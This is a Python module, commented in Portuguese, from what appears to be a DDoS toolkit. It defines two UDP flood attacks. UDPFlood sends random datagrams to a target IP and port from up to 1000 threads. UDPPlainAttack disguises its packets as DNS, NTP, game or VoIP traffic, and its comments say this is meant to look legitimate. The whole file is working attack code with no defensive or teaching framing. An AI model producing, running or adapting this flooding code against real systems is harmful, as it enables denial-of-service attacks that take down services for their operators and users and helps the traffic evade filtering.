"""
Implementação de ataques UDP - OTIMIZADO
"""
import socket
import random
import threading
import time
from .base import BaseAttack
from ..core.config import AttackConfig

class UDPFlood(BaseAttack):
    """UDP Flood de alta velocidade - OTIMIZADO"""

    def execute(self):
        self.running = True
        print("🚀 Iniciando UDP Flood (Otimizado)...")

        def attack_thread(thread_id):
            packets_sent = 0
            errors = 0
            start_time = time.time()
            
            # Pré-gera dados para esta thread
            data = random._urandom(min(self.config.packet_size, 1024))

            while (not self.stop_event.is_set() and
                   (time.time() - start_time) < self.config.duration):
                try:
                    # Socket UDP é mais leve, pode criar rapidamente
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.settimeout(0.01)  # Timeout MUITO curto
                    
                    # Envia dados
                    sock.sendto(data, (self.config.target_ip, self.config.target_port))
                    packets_sent += 1
                    bytes_sent = len(data)
                    self._update_stats(bytes_sent)
                    
                    sock.close()

                except socket.timeout:
                    # Timeout é normal em UDP flood
                    pass
                except Exception as e:
                    errors += 1
                    if errors % 1000 == 0:
                        self._handle_error()

            if packets_sent > 0:
                print(f"🧵 Thread {thread_id}: {packets_sent} pacotes, {errors} erros")

        # AUMENTA número de threads para UDP
        max_threads = min(self.config.threads, 1000)  # Mais threads para UDP
        print(f"🔧 Usando {max_threads} threads para UDP Flood")

        threads = []
        for i in range(max_threads):
            if self.stop_event.is_set():
                break
            thread = threading.Thread(target=attack_thread, args=(i,))
            thread.daemon = True
            thread.start()
            threads.append(thread)

        for thread in threads:
            thread.join(timeout=self.config.duration + 2)

class UDPPlainAttack(BaseAttack):
    """UDP Plain - Pacotes UDP simples"""

    def execute(self):
        self.running = True
        print("🚀 Iniciando UDP Plain Attack...")

        def attack_thread(thread_id):
            packets_sent = 0
            errors = 0
            start_time = time.time()

            while (not self.stop_event.is_set() and
                   (time.time() - start_time) < self.config.duration):
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.settimeout(0.01)

                    # Dados mais realistas para parecer tráfego legítimo
                    payload = self._generate_realistic_payload()
                    sock.sendto(payload, (self.config.target_ip, self.config.target_port))
                    packets_sent += 1
                    bytes_sent = len(payload)
                    self._update_stats(bytes_sent)

                    sock.close()

                except Exception as e:
                    errors += 1
                    if errors % 1000 == 0:
                        self._handle_error()

            if packets_sent > 0:
                print(f"🧵 Thread {thread_id}: {packets_sent} pacotes, {errors} erros")

        # Limita threads
        max_threads = min(self.config.threads, 800)
        print(f"🔧 Usando {max_threads} threads para UDP Plain")

        threads = []
        for i in range(max_threads):
            if self.stop_event.is_set():
                break
            thread = threading.Thread(target=attack_thread, args=(i,))
            thread.daemon = True
            thread.start()
            threads.append(thread)

        for thread in threads:
            thread.join(timeout=self.config.duration + 2)

    def _generate_realistic_payload(self) -> bytes:
        """Gera payload UDP que parece tráfego legítimo"""
        payload_types = [
            self._generate_dns_like_payload,
            self._generate_ntp_like_payload,
            self._generate_game_traffic_payload,
            self._generate_voip_like_payload
        ]

        generator = random.choice(payload_types)
        return generator()

    def _generate_dns_like_payload(self) -> bytes:
        """Gera payload similar a consulta DNS"""
        return bytes([0x00, 0x01, 0x01, 0x00, 0x00, 0x01]) + random._urandom(20)

    def _generate_ntp_like_payload(self) -> bytes:
        """Gera payload similar a NTP"""
        return bytes([0x1B]) + random._urandom(47)  # NTP version 3

    def _generate_game_traffic_payload(self) -> bytes:
        """Gera payload similar a tráfego de jogos"""
        return random._urandom(random.randint(10, 100))

    def _generate_voip_like_payload(self) -> bytes:
        """Gera payload similar a VoIP"""
        # Payload RTP-like
        rtp_header = bytes([0x80, 0x00]) + random._urandom(10)
        voice_data = random._urandom(random.randint(20, 160))
        return rtp_header + voice_data
